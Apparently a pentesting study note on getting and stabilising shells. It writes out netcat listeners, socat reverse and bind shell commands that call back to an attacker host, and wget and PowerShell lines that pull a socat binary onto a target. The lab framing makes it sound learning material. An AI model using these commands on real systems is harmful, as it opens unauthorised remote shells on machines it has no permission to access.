# Privilege Escalation

## Shell  
- [Reverse Shell Cheat Sheet](https://web.archive.org/web/20200901140719/http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)  
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
- `/usr/share/webshells`: Pre-installed webshells on kali  

### Types of Shell
- Reverse shells are when the target is forced to execute code that connects back to your computer.
- Bind shells are when the code executed on the target is used to start a listener attached to a shell directly on the target.  

### Netcat  
*Reverse Shells*  
`nc -lvnp <port-number>`: starting a netcat listener  
`-l` is used to tell netcat that this will be a listener  
`-v` is used to request a verbose output  
`-n` tells netcat not to resolve host names or use DNS. Explaining this is outwith the scope of the room.  
`-p` indicates that the port specification will follow.  
Be aware that if you choose to use a port below 1024, you will need to use `sudo` when starting your listener.   
<br>

*Blind Shells*  
`nc <target-ip> <chosen-port>`: make an outbound connection to connect a
netcat listener  

#### Netcat Shell Stabilization
*Technique 1: Python*  
1. `python -c 'import pty;pty.spawn("/bin/bash")'`  
    note that some targets may need the version of Python specified.   
2. `export TERM=xterm` -- this will give us access to term commands such as `clear`  
3.  Background the shell using `Ctrl + Z`. Back in our own terminal we use `stty raw -echo; fg`. This does two things: first, it turns off our own terminal echo (which gives us access to tab autocompletes, the arrow keys, and Ctrl + C to kill processes). It then foregrounds the shell, thus completing the process.   
    <img src="https://user-images.githubusercontent.com/73976100/222940244-bb418620-8fc6-4f51-ab5a-27e8dfbdbab4.png" width="600">  
Note that if the shell dies, any input in your own terminal will not be visible (as a result of having disabled terminal echo). To fix this, type `reset` and press enter.  

*Technique 2: rlwrap*  
    rlwrap is a program which, in simple terms, gives us access to history, tab autocompletion and the arrow keys immediately upon receiving a shell.  
    `sudo apt install rlwrap`  
    `rlwrap nc -lvnp <port>`  
    When dealing with a Linux target, it's possible to completely stabilise, by using the same trick as in step three of the previous technique: background the shell with `Ctrl + Z`, then use `stty raw -echo; fg` to stabilise and re-enter the shell.  

*Technique 3: Socat*  
    The third easy way to stabilise a shell is quite simply to use an initial netcat shell as a stepping stone into a more fully-featured socat shell. Bear in mind that this technique is limited to Linux targets, as a Socat shell on Windows will be no more stable than a netcat shell. To accomplish this method of stabilisation we would first transfer a [socat static compiled binary](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true) (a version of the program compiled to have no dependencies) up to the target machine. A typical way to achieve this would be using a webserver on the attacking machine inside the directory containing your socat binary (`sudo python3 -m http.server 80`), then, on the target machine, using the netcat shell to download the file. On Linux this would be accomplished with curl or wget (`wget <LOCAL-IP>/socat -O /tmp/socat`).  
    For the sake of completeness: in a Windows CLI environment the same can be done with Powershell, using either Invoke-WebRequest or a webrequest system class, depending on the version of Powershell installed (`Invoke-WebRequest -uri <LOCAL-IP>/socat.exe -outfile C:\\Windows\temp\socat.exe`). We will cover the syntax for sending and receiving shells with Socat in the upcoming tasks.  

`stty -a`: Change the terminal tty size  
<img src="https://user-images.githubusercontent.com/73976100/222940820-00bf8238-f60a-4d4f-afe9-d794fd46fc42.png" width="600">  
`stty rows <number>`  
`stty cols <number>`

### Socat
*Reverse Shells*  
`socat TCP-L:<port> -`:  this is taking two points (a listening port, and standard input) and connecting them together.  
`socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes`: On Windows command to connect back  
`socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"`: On Linux  

*Bind Shells*  
`socat TCP-L:<PORT> EXEC:"bash -li"`: On a Linux target  
`socat TCP-L:<PORT> EXEC:powershell.exe,pipes`: On a Windows target  
`socat TCP:<TARGET-IP>:<TARGET-PORT> -`:  On an attacking machine  

*a fully stable Linux tty reverse shell*
```
socat TCP-L:<port> FILE:`tty`,raw,echo=0
```
```
socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane
```
<img src="https://user-images.githubusercontent.com/73976100/222942912-2b022e20-e9f5-4b14-b888-465bcee32fad.png">  
<details>

- pty, allocates a pseudoterminal on the target -- part of the stabilisation process
- stderr, makes sure that any error messages get shown in the shell (often a problem with non-interactive shells)
- sigint, passes any Ctrl + C commands through into the sub-process, allowing us to kill commands inside the shell
- setsid, creates the process in a new session
- sane, stabilises the terminal, attempting to "normalise" it.
</details>


